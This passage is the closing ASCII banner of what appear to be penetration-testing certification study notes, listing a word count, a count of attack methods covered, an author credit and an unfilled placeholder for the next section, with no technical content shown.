║  [✓] SESSION COMPLETE — ZERO KNOWLEDGE GAPS DETECTED                 ║
║  [✓] 3 PHASES · ~6,000 WORDS · 6 ATTACK METHODS DOCUMENTED           ║
║  [✓] AUTHORED BY: Hexsein · T4E Channel · CPTS Candidate             ║
║  [→] NEXT TARGET: SEC-[NUM+1] — [REPLACE: NEXT SECTION NAME]         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```


